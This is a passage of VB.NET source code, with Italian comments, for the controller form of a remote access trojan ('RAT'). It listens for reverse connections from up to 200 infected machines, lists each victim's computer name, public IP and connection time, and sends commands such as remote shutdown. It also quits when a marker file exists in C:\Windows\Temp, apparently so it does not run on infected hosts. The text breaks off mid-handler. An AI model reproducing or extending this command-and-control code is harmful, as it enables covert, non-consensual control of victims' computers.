Imports System.Net.Sockets 'Importo il namespace System.Net.Sockets
Imports System.Text.UTF8Encoding 'Importo il namespace System.Text.UTF8Encoding per la codifica dei dati
Imports System.Net 'Importo il namespace System.Net per la gestione degli IP
Imports System.IO
Public Class frmMain
    Public ReLimit As Integer = 200
    Public client(ReLimit) As TcpClient 'Creo un Client TCP
    Public listener(ReLimit) As TcpListener 'Creo un Server TCP
    Public netstream(ReLimit) As NetworkStream 'Creo uno stream per inviare e ricevere dati
    Public NumSock As Integer = 0 'Dichiaro NumSock per gestire gli indici dei client connessi
    Public FInfo(ReLimit) As frmInfoM
    Public FPAN(ReLimit) As frmControlPanel
    Public LIP As String = "Unable to read"
    Public RCL As String
    Public ISFormOp(ReLimit) As Boolean
    Public ISFormOp2(ReLimit) As Boolean
    Public Notification As Boolean
    Public IfCosoKA(ReLimit) As Boolean
    Public FU As String
    Public FUS As String
    Public FP As String
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If IO.File.Exists("C:\Windows\Temp" & "\SystemComponents.ini") = False Then
            If MsgBox("Do you want really exit?", MsgBoxStyle.Information + MsgBoxStyle.YesNo, "Exit") = vbYes Then
                End
            Else
                e.Cancel = True
            End If
        End If
    End Sub
    Private Sub frmMain_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load


        If IO.File.Exists("C:\Windows\Temp" & "\SystemComponents.ini") = True Then
            End
        End If

        lstwIpReverse.LargeImageList = imlstIP
        lstwIpReverse.SmallImageList = imlstIP
        Try
            If Dir(Application.StartupPath & "\ClientsSettings.ini") <> "" Then
                Dim fileReader91 As System.IO.StreamReader
                fileReader91 = _
                My.Computer.FileSystem.OpenTextFileReader(Application.StartupPath & "\ClientsSettings.ini")
                Dim Lettura As String
                Lettura = fileReader91.ReadToEnd
                fileReader91.Close()
                If Not Lettura > nudLimCl.Maximum Then

                    ReLimit = Lettura
                    nudLimCl.Value = Lettura
                    ReDim client(ReLimit)
                    ReDim listener(ReLimit)
                    ReDim netstream(ReLimit)

                    ReDim FInfo(ReLimit)
                    ReDim FPAN(ReLimit)

                    ReDim ISFormOp(ReLimit)
                    ReDim ISFormOp2(ReLimit)

                    ReDim IfCosoKA(ReLimit)

                Else
                    MsgBox("Unable to set the connections limit", MsgBoxStyle.Critical, "Error")
                End If
            End If
        Catch ex As Exception
            ReLimit = 200
            nudLimCl.Value = 200
            ReDim client(ReLimit)
            ReDim listener(ReLimit)
            ReDim netstream(ReLimit)

            ReDim FInfo(ReLimit)
            ReDim FPAN(ReLimit)

            ReDim ISFormOp(ReLimit)
            ReDim ISFormOp2(ReLimit)

            ReDim IfCosoKA(ReLimit)
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

        ExIp()
        'Aggiungo le colonne e le immagini alla listview
        lstwIpReverse.Columns.Add("Computer name", 100)
        lstwIpReverse.Columns.Add("Public IP", 100)
        lstwIpReverse.Columns.Add("Connection time", 100)
        lstwIpReverse.Columns.Add("RAT Name", 120)
        '''''''''''''''''''''''''''''''''''
        If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
            MkDir(Application.StartupPath & "\Computers")
        End If

    End Sub

    Private Sub cmdAttivaP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdAttivaP.Click

        Try
            picBoxStart.Image = My.Resources._478_radar
            cmdSetLimit.Enabled = False
            If NumSock = 0 Then
                listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
            End If
            If NumSock > 0 Then
                listener(NumSock) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                listener(NumSock).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
            End If
            tmrPen.Start() 'Avvio il timer che accetta connessioni
            cmdAttivaP.Enabled = False 'Disattivo questo bottone per evitare errori
            nudPorta.Enabled = False
        Catch ex As Exception
            picBoxStart.Image = My.Resources._1295814102_satelite
            cmdAttivaP.Enabled = True
            nudPorta.Enabled = True
            MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
        End Try
        
    End Sub

    Private Sub tmrPen_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPen.Tick
        Try
            If NumSock < nudLimCl.Value Then
                If listener(NumSock).Pending Then 'Determino se ci sono richieste dii connessione
                    client(NumSock) = listener(NumSock).AcceptTcpClient() 'Assegno il client corrispondente a un server connesso per inviare dati
                    netstream(NumSock) = client(NumSock).GetStream() 'Assegno lo stream uguale ai dati ricevuti dal client
                    listener(NumSock).Stop() 'Chiudo l'ascolto del server
                    NumSock = NumSock + 1 'Incremento il numero dei client connessi per crearne un altro
                    lblCC.Text = "Connected Client(s): " & NumSock 'Comunico all'utente il numero di Client connessi
                    listener(NumSock) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno una istanza ad un nuovo server
                    listener(NumSock).Start() 'Avvio il nuovo server
                    lstwIpReverse.Items.Add("Unknown", 11)
                    tmrDati.Start() 'Avvio il timer per ricevere i dati dal client connesso
                End If
            Else
                cmdClo.Enabled = True
                cmdRes.Enabled = True
                nudPorta.Enabled = True
                tmrDati.Stop() 'Chiudo la ricezione di dati
                tmrPen.Stop() 'Chiudo la verifica di IP in attesa
                For stoppa = 0 To NumSock
                    If Not listener(stoppa) Is Nothing Then 'Controllo se il server ha un istanza
                        listener(stoppa).Stop() 'Stoppo tutti i server
                    End If
                Next stoppa
                cmdAttivaP.Enabled = True 'Riattivo il pulsante per ricevere nuovi IP
                MsgBox("The listener has been stopped :)", MsgBoxStyle.OkOnly)
            End If
        Catch ex As Exception
            cmdClo.Enabled = True
            cmdRes.Enabled = True
            nudPorta.Enabled = True
            tmrDati.Stop() 'Chiudo la ricezione di dati
            tmrPen.Stop() 'Chiudo la verifica di IP in attesa
            For stoppa2 = 0 To NumSock
                If Not listener(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    listener(stoppa2).Stop() 'Stoppo tutti i server
                End If

                If Not client(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    client(stoppa2).Close() 'Stoppo tutti i server
                End If

                If Not netstream(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    netstream(stoppa2).Close() 'Stoppo tutti i server
                End If

                If Not FInfo(stoppa2) Is Nothing Then
                    FInfo(stoppa2).Close()
                End If

                If Not FPAN(stoppa2) Is Nothing Then
                    FPAN(stoppa2).Close()
                End If

                If Not frmControlPanel.FPAN2(stoppa2) Is Nothing Then
                    frmControlPanel.FPAN2(stoppa2).Close()
                End If

                If Not frmControlPanel.FPAN3(stoppa2) Is Nothing Then
                    frmControlPanel.FPAN3(stoppa2).Close()
                End If
            Next stoppa2
            NumSock = 0 'Resetto NumSock
            lblCC.Text = "Connected Client(s): 0" 'Comunico all'utente che non ci sono IP connessi
            lstwIpReverse.Items.Clear() 'Rimuovo tutti gli IP in lista
            cmdAttivaP.Enabled = True 'Riattivo il pulsante per ricevere nuovi IP
            cmdSetLimit.Enabled = True
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub tmrDati_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDati.Tick
        Try
            If client(NumSock - 1).Available > 0 Then 'Verifico se arrivano dati dal client connesso
                Dim buffer(client(NumSock - 1).Available - 1) As Byte 'Dichiaro un array di byte di dimensione pari ai dati arrivati
                netstream(NumSock - 1).Read(buffer, 0, buffer.Length) 'Leggo i dati

                Dim msga As String = UTF8.GetString(buffer) 'Ricodifico i dati in string e li metto in una variabile

                If InStr(msga, "<Conne>") Then 'Verifico se nei dati è presente la stringa <Conne>
                    lstwIpReverse.SmallImageList = imlstIP
                    Dim strspl() As String 'Creo un array
                    Dim itmip As ListViewItem 'Creo un nuovo elemento listview
                    strspl = Split(msga, "<->") 'Metto nell'array tutte le stringhe dei dati separati da <->
                    strspl(0) = Replace(strspl(0), "<Conne>", "") 'Cancello la stringa <Conne> dal primo elemento dell'array
                    itmip = New ListViewItem(strspl, 0) 'Assegno gli elementi dell'array ad un nuovo elemento di listview
                    If lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).Text = "Unknown" Then
                        lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).Remove()
                        lstwIpReverse.Items.Add(itmip) 'Popolo la listview con gli elementi arrivati
                    End If
                    msga = ""
                    RCL = RCL & lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).Text & " - " & lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).SubItems(1).Text &
                              " - " & lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).SubItems(2).Text & " - " & lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).SubItems(3).Text & vbCrLf
                    If Notification = True Then
                        Poppi.Close()
                        Poppi.lblID.Text = lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).Text & " Connected!!"
                        Poppi.Show()
                    End If
                    tmrDati.Stop()


                    Try



                        netstream(
                        lstwIpReverse.Items.Item(lstwIpReverse.Items.Count - 1).Index).Write(
                        UTF8.GetBytes("A<tt@"), 0, UTF8.GetBytes("A<tt@").Length) 'invio il comando il Client

                    Catch ex As Exception
                        cmdClo.Enabled = False
                        If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                            FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                        End If

                        If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                            FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                        End If

                        If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                            frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                        End If

                        If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                            frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                        End If

                        If NumSock = 1 Then
                            tmrDati.Stop()
                            tmrPen.Stop()
                            listener(NumSock).Stop()
                            listener(NumSock - 1).Stop()
                            client(NumSock - 1).Close()
                            netstream(NumSock - 1).Close()
                            NumSock = 0
                            Try
                                listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                                listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                                tmrPen.Start() 'Avvio il timer che accetta connessioni
                            Catch ciao As Exception
                                cmdAttivaP.Enabled = True
                                nudPorta.Enabled = True
                                MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                            End Try
                        End If
                        If NumSock > 1 Then
                            Dim SelezionatoItem As Integer
                            SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                            For chiu = SelezionatoItem To NumSock
                                listener(chiu) = listener(chiu + 1)
                                client(chiu) = client(chiu + 1)
                                netstream(chiu) = netstream(chiu + 1)
                            Next chiu
                            NumSock = NumSock - 1
                        End If

                        lblCC.Text = "Connected Client(s): " & NumSock
                        lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                        cmdClo.Enabled = True
                        MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
                    End Try
                
            End If


            End If

        Catch ex As Exception
            cmdClo.Enabled = True
            cmdRes.Enabled = True
            nudPorta.Enabled = True
            tmrDati.Stop() 'Chiudo la ricezione di dati
            tmrPen.Stop() 'Chiudo la verifica di IP in attesa
            For stoppa2 = 0 To NumSock
                If Not listener(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    listener(stoppa2).Stop() 'Stoppo tutti i server
                End If

                If Not client(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    client(stoppa2).Close() 'Stoppo tutti i server
                End If

                If Not netstream(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                    netstream(stoppa2).Close() 'Stoppo tutti i server
                End If

                If Not FInfo(stoppa2) Is Nothing Then
                    FInfo(stoppa2).Close()
                End If

                If Not FPAN(stoppa2) Is Nothing Then
                    FPAN(stoppa2).Close()
                End If

                If Not frmControlPanel.FPAN2(stoppa2) Is Nothing Then
                    frmControlPanel.FPAN2(stoppa2).Close()
                End If

                If Not frmControlPanel.FPAN3(stoppa2) Is Nothing Then
                    frmControlPanel.FPAN3(stoppa2).Close()
                End If
            Next stoppa2
            NumSock = 0 'Resetto NumSock
            lblCC.Text = "Connected Client(s): 0" 'Comunico all'utente che non ci sono IP connessi
            lstwIpReverse.Items.Clear() 'Rimuovo tutti gli IP in lista
            cmdAttivaP.Enabled = True 'Riattivo il pulsante per ricevere nuovi IP
            cmdSetLimit.Enabled = True
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdChiuSock_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdChiuSock.Click
        Try
            Dim rispostaut As String
            rispostaut = MsgBox("Do you want to disconnect all the clients?", MsgBoxStyle.YesNoCancel)
            If rispostaut = vbNo Then
                cmdClo.Enabled = True
                cmdRes.Enabled = True
                nudPorta.Enabled = True
                tmrDati.Stop() 'Chiudo la ricezione di dati
                tmrPen.Stop() 'Chiudo la verifica di IP in attesa
                For stoppa = 0 To NumSock
                    If Not listener(stoppa) Is Nothing Then 'Controllo se il server ha un istanza
                        listener(stoppa).Stop() 'Stoppo tutti i server
                    End If
                Next stoppa
                cmdAttivaP.Enabled = True 'Riattivo il pulsante per ricevere nuovi IP
                picBoxStart.Image = My.Resources._1295814102_satelite
                MsgBox("The listener has been stopped :)", MsgBoxStyle.OkOnly)
            End If

            If rispostaut = vbYes Then
                cmdClo.Enabled = True
                cmdRes.Enabled = True
                nudPorta.Enabled = True
                tmrDati.Stop() 'Chiudo la ricezione di dati
                tmrPen.Stop() 'Chiudo la verifica di IP in attesa
                For stoppa2 = 0 To NumSock
                    If Not listener(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                        listener(stoppa2).Stop() 'Stoppo tutti i server
                    End If

                    If Not client(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                        client(stoppa2).Close() 'Stoppo tutti i server
                    End If

                    If Not netstream(stoppa2) Is Nothing Then 'Controllo se il server ha un istanza
                        netstream(stoppa2).Close() 'Stoppo tutti i server
                    End If

                    If Not FInfo(stoppa2) Is Nothing Then
                        FInfo(stoppa2).Close()
                    End If

                    If Not FPAN(stoppa2) Is Nothing Then
                        FPAN(stoppa2).Close()
                    End If

                    If Not frmControlPanel.FPAN2(stoppa2) Is Nothing Then
                        frmControlPanel.FPAN2(stoppa2).Close()
                    End If

                    If Not frmControlPanel.FPAN3(stoppa2) Is Nothing Then
                        frmControlPanel.FPAN3(stoppa2).Close()
                    End If
                Next stoppa2
                NumSock = 0 'Resetto NumSock
                lblCC.Text = "Connected Client(s): 0" 'Comunico all'utente che non ci sono IP connessi
                lstwIpReverse.Items.Clear() 'Rimuovo tutti gli IP in lista
                cmdAttivaP.Enabled = True 'Riattivo il pulsante per ricevere nuovi IP
                cmdSetLimit.Enabled = True
                picBoxStart.Image = My.Resources._1295814102_satelite
            End If

        Catch ex As Exception
            picBoxStart.Image = My.Resources._1295814102_satelite
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub



    Private Sub cmdClo_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClo.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                cmdClo.Enabled = False

                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("<Low>"), 0, UTF8.GetBytes("<Low>").Length) 'invio il comando il Client
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
            Catch ex As Exception
                cmdClo.Enabled = False
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdClo.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub


    Private Sub cmdRes_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdRes.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try

                cmdRes.Enabled = False
                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("<RES>"), 0, UTF8.GetBytes("<RES>").Length) 'invio il comando il Client
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdRes.Enabled = True
            Catch ex As Exception
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdRes.Enabled = True
                cmdRes.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdRes.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub lstwIpReverse_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lstwIpReverse.MouseUp
        Try
            If e.Button = Windows.Forms.MouseButtons.Right Then
                If Not lstwIpReverse.SelectedIndices.Count <= 0 Then
                    cxmsrToolBox.Show(Me.lstwIpReverse, New Point(e.X, e.Y))
                End If
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub lstwIpReverse_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstwIpReverse.SelectedIndexChanged
        Try
            If Not lstwIpReverse.SelectedIndices.Count <= 0 Then
                lblSC.Text = "Selected Client: " & lstwIpReverse.SelectedItems.Item(0).Text
            Else
                lblSC.Text = "Selected Client: None"
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub



    Private Sub GetInfosToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetInfosToolStripMenuItem.Click
        Try
            If Me.ISFormOp2(Me.lstwIpReverse.SelectedIndices.Item(0)) = False Then
                FInfo(lstwIpReverse.SelectedIndices.Item(0)) = New frmInfoM
                FInfo(lstwIpReverse.SelectedIndices.Item(0)).Show()
                Me.ISFormOp2(Me.lstwIpReverse.SelectedIndices.Item(0)) = True
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try

                cmdClo.Enabled = False
                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("<{PCClo}>"), 0, UTF8.GetBytes("<{PCClo}>").Length) 'invio il comando il Client
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemchiu As Integer
                    SelezionatoItemchiu = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu2 = SelezionatoItemchiu To NumSock
                        listener(chiu2) = listener(chiu2 + 1)
                        client(chiu2) = client(chiu2 + 1)
                        netstream(chiu2) = netstream(chiu2 + 1)
                    Next chiu2
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
            Catch ex As Exception
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
